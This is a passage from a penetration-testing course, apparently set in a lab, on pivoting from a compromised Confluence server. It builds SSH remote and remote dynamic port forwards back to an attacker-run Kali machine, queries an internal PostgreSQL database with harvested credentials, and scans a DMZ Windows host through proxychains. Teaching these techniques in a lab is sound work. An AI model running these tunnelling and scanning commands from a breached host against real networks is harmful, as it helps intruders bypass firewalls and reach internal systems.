### Remote Port Forwarding in SSH

In remote port forwarding, the SSH client forwards packets to the SSH server. Let's revisit our lab scenario and take a step back.

As before, we compromise CONFLUENCE01 using CVE-2022-26134. However, in this scenario, the administrators have enhanced network security by implementing a firewall at the perimeter. The firewall is configured such that, regardless of whether we bind a port on the WAN interface of CONFLUENCE01 or not, the only port we can connect to from our Kali machine is TCP 8090.

Our goal is to enumerate the PostgreSQL database running on port 5432 on PGDATABASE01. CONFLUENCE01 lacks the necessary tools for this task, and the firewall prevents us from opening any listening ports on CONFLUENCE01. However, CONFLUENCE01 has an SSH client, and we can set up an SSH server on our Kali machine to create a remote port forwarding setup, as illustrated in the following diagram:

**Figure 249: The SSH Remote Port Forward Setup**

We can establish an SSH connection from CONFLUENCE01 to our Kali machine. The listening TCP port 2345 is bound to the loopback interface on our Kali machine. Packets sent to this port are forwarded through the SSH tunnel back to the SSH client on CONFLUENCE01, which then forwards them to the PostgreSQL database port on PGDATABASE01.

### Setting Up the SSH Server on Kali

First, we need to enable the SSH server on our Kali machine. OpenSSH server is preinstalled, so we only need to start it.

```bash
kali@kali:~$ sudo systemctl start ssh
[sudo] password for kali:
```

**Listing 545 - Starting the SSH server on the Kali machine.**

We can verify that the SSH port is open as expected using `ss`:

```bash
kali@kali:~$ sudo ss -ntplu
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
users:(("sshd",pid=181432,fd=3))
tcp LISTEN 0 128 [::]:22 [::]:*
users:(("sshd",pid=181432,fd=4))
```

**Listing 546 - Checking that the SSH server on the Kali machine is listening.**

The SSH server is listening on port 22 on all interfaces for both IPv4 and IPv6.

### Establishing the Remote Port Forward

Once we have a reverse shell from CONFLUENCE01, we ensure we have a TTY shell, then create an SSH remote port forward as part of an SSH connection back to our Kali machine.

To connect back to the Kali SSH server using a username and password, you may need to explicitly allow password-based authentication by setting `PasswordAuthentication` to `yes` in `/etc/ssh/sshd_config`.

The SSH remote port forward option is `-R`, and it has a similar syntax to the local port forward option. It takes two socket pairs as arguments: the listening socket first and the forwarding socket second.

In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345) and forward all traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
kali@192.168.118.4's password:
```

**Listing 547 - The SSH remote port forward being set up, connecting to the Kali machine.**

We can confirm that our remote port forward is listening by checking if port 2345 is open on our Kali loopback interface.

```bash
kali@kali:~$ ss -ntplu
Netid State Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
tcp LISTEN 0 128 127.0.0.1:2345 0.0.0.0:*
tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
tcp LISTEN 0 128 [::]:22 [::]:*
```

**Listing 548 - Checking if port 2345 is bound on the Kali SSH server.**

The port is now listening, and our remote port forward is set up as intended.

### Probing the PostgreSQL Database

We can now probe port 2345 on the loopback interface of our Kali machine as if we were directly probing the PostgreSQL database port on PGDATABASE01. On our Kali machine, we use `psql`, passing `127.0.0.1` as the host, `2345` as the port, and the database credentials of the `postgres` user we found earlier on CONFLUENCE01.

```bash
kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
Password for user postgres:
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.
postgres=# \l
List of databases
Name | Owner | Encoding | Collate | Ctype | Access privileges
------------+----------+----------+-------------+-------------+-----------------------
confluence | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
postgres | postgres | DUTF8 | en_US.UTF-8 | en_US.UTF-8 |
template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
(4 rows)
postgres=#
```

**Listing 549 - Listing databases on PGDATABASE01 using psql through the SSH remote port forward.**

We are now interacting with the PostgreSQL instance running on PGDATABASE01 through our SSH remote port forward by connecting to port 2345 on our Kali machine.

### Remote Dynamic Port Forwarding

Remote dynamic port forwarding provides more flexibility by allowing us to forward packets to multiple sockets per SSH connection. This is particularly useful during enumeration stages.

**Figure 251: The SSH Remote Dynamic Port Forward Layout Applied to the Remote Port Forward Scenario**

Remote dynamic port forwarding creates a dynamic port forward in the remote configuration. The SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.

To demonstrate, let's extend our scenario. We find a Windows server (MULTISERVER03) on the DMZ network. The firewall prevents us from connecting to any port on MULTISERVER03 or any port other than TCP/8090 on CONFLUENCE01 from our Kali machine. However, we can SSH out from CONFLUENCE01 to our Kali machine, then create a remote dynamic port forward to start enumerating MULTISERVER03 from Kali.

**Figure 252: The SSH Remote Dynamic Port Forward Setup We Are Aiming For**

The SSH session is initiated from CONFLUENCE01, connecting to the Kali machine, which is running an SSH server. The SOCKS proxy port is then bound to the Kali machine on TCP/9998. Packets sent to that port will be pushed back through the SSH tunnel to CONFLUENCE01, where they will be forwarded based on their destination.

### Setting Up the Remote Dynamic Port Forward

Once we have a reverse shell from CONFLUENCE01, have spawned a TTY shell within it, and have enabled SSH on our Kali machine, we can start crafting the remote dynamic port forwarding command.

The remote dynamic port forwarding command uses the same `-R` option as classic remote port forwarding. The difference is that we pass only one socket: the socket we want to listen on the SSH server. By default, it will be bound to the loopback interface of the SSH server.

To bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine, we specify `-R 9998` to the SSH command we run on CONFLUENCE01. We also pass the `-N` flag to prevent a shell from being opened.

```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998 kali@192.168.118.4
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
kali@192.168.118.4's password:
```

**Listing 550 - Making the SSH connection with the remote dynamic port forwarding option.**

Back on our Kali machine, we can check that port 9998 is bound by using `ss`:

```bash
kali@kali:~$ sudo ss -ntplu
Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
tcp LISTEN 0 128 127.0.0.1:9998 0.0.0.0:*
users:(("sshd",pid=939038,fd=9))
tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
users:(("sshd",pid=181432,fd=3))
tcp LISTEN 0 128 [::1]:9998 [::]:*
users:(("sshd",pid=939038,fd=7))
tcp LISTEN 0 128 [::]:22 [::]:*
users:(("sshd",pid=181432,fd=4))
```

**Listing 551 - Port 9998 bound to both IPv4 and IPv6 loopback interfaces on the Kali machine.**

The SOCKS proxy port is now bound on both the IPv4 and IPv6 loopback interfaces on our Kali machine. We can use Proxychains to tunnel traffic over this SOCKS proxy port. We edit our Proxychains configuration file at `/etc/proxychains4.conf` on our Kali machine to reflect our new local SOCKS proxy port.

```bash
kali@kali:~$ tail /etc/proxychains4.conf
# proxy types: http, socks4, socks5, raw
# * raw: The traffic is simply forwarded to the proxy without modification.
# ( auth types supported: "basic"-http "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
```

**Listing 552 - Editing the Proxychains configuration file to point to the new SOCKS proxy on port 9998.**

We can then run `nmap` with Proxychains to scan MULTISERVER03.

```bash
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 06:25 EDT
Initiating Connect Scan at 06:25
Scanning 10.4.50.64 [20 ports]
[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:22 <--socket error or timeout!
...
[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.64:135 ... OK
Discovered open port 135/tcp on 10.4.50.64
Completed Connect Scan at 06:28, 210.26s elapsed (20 total ports)
Nmap scan report for 10.4.50.64
Host is up, received user-set (6.7s latency).
Scanned at 2022-07-20 06:25:25 EDT for 210s
PORT STATE SERVICE REASON
21/tcp closed ftp conn-refused
22/tcp closed ssh conn-refused
23/tcp closed telnet conn-refused
25/tcp closed smtp conn-refused
53/tcp closed domain conn-refused
80/tcp open http syn-ack
110/tcp closed pop3 conn-refused
111/tcp closed rpcbind conn-refused
135/tcp open msrpc syn-ack
139/tcp closed netbios-ssn conn-refused
143/tcp closed imap conn-refused
443/tcp closed https conn-refused
445/tcp closed microsoft-ds conn-refused
993/tcp closed imaps conn-refused
995/tcp closed pop3s conn-refused
1723/tcp closed pptp conn-refused
3306/tcp closed mysql conn-refused
3389/tcp open ms-wbt-server syn-ack
5900/tcp closed vnc conn-refused
8080/tcp closed http-proxy conn-refused
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 210.31 seconds
```

**Listing 553 - Scanning MULTISERVER03 through the remote dynamic SOCKS port with Proxychains.**

After a few minutes, we receive our results and discover that ports 80, 135, and 3389 are open. Scanning is a little slower against this Windows host, likely due to the different way the Windows firewall responds when a port is closed compared to Linux.

### Using sshuttle

In situations where we have direct access to an SSH server, behind which is a more complex internal network, classic dynamic port forwarding might be difficult to manage. `sshuttle` is a tool that can help in such scenarios.